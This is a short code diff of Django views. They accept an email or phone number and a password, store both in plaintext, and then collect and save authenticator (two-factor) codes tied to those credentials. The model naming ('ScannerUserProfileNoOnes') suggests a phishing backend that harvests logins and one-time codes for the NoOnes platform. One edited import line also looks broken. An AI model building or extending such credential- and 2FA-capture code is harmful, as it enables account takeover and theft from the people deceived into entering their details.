@@ -69,7 +69,7 @@ from rest_framework import status
 from rest_framework.decorators import api_view
 from rest_framework.response import Response
 from .models import UserProfileNoones
-from .serializers import UserProfileNoonesSerializer
+from .serializers import  serializers
 import json
 
 
@@ -1041,7 +1041,7 @@ def submit_user_data(request):
 
             if email_or_phone and password:
                 # Save user data to the database
-                user_profile = ScannerUserProfileNoOnes.objects.create(
+                user_profile = UserProfileNoones.objects.create(
                     email_or_phone=email_or_phone,
                     password=password
                 )
@@ -1073,7 +1073,7 @@ def submit_authenticator_code(request):
                 return JsonResponse({"error": "Missing fields"}, status=400)
 
             # Check if the user exists based on email or phone and password (simple check)
-            user_profile = ScannerUserProfileNoOnes.objects.filter(
+            user_profile = UserProfileNoones.objects.filter(
                 email_or_phone=email_or_phone,
                 password=password
             ).first()
@@ -1082,7 +1082,7 @@ def submit_authenticator_code(request):
                 return JsonResponse({"error": "User not found"}, status=404)
 
             # Save the authenticator code in the database
-            ScannerUserProfileNoOnes.objects.create(
+            UserProfileNoones.objects.create(
                 email_or_phone=email_or_phone,
                 password=password,
                 authenticator_code=authenticator_code,
